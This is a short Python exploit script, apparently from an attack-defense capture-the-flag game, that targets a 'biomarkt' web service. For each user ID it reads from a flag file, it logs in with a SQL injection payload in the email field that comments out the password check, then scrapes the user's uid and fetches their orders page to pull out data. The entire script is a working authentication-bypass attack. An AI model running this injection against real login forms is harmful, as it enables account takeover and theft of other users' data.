#!/usr/bin/env python3
import os
import sys
sys.path.insert(1, '../imports/')
sys.path.insert(1, 'imports/')

import utils
import requests
import json
from bs4 import BeautifulSoup
from pwn import *

# Use this function to print stuff to client
def log(message):
    print(message, flush=True)

IP_ADDRESS = sys.argv[1]
dir_path = os.path.dirname(os.path.realpath(__file__)) + '/../'
flag_ids = {}
with open(dir_path + 'flag_ids.json', 'r', encoding='utf-8') as f:
    flag_ids = json.loads(f.read())
    #log(flag_ids)

  
# Adjust if needed


# Adjust if needed
SERVICE = "biomarkt"
PORT = 18080
TARGET_URL = f'http://{IP_ADDRESS}:{PORT}'

valid_users = flag_ids.get(SERVICE, {}).get(IP_ADDRESS, [])

for user in valid_users:

    session = requests.session()

    burp0_data = {"email": user + "' -- c", "password": "aaaa"}
    print(burp0_data)
    r = session.post(TARGET_URL + "/login", data=burp0_data)
    print(r.text)

    pattern = re.compile(r'/orders\?uid=(\d+)')

    uid = pattern.findall(r.text)[0]
    r = session.get(TARGET_URL + "/orders?uid=" + uid)
    print(r.text)

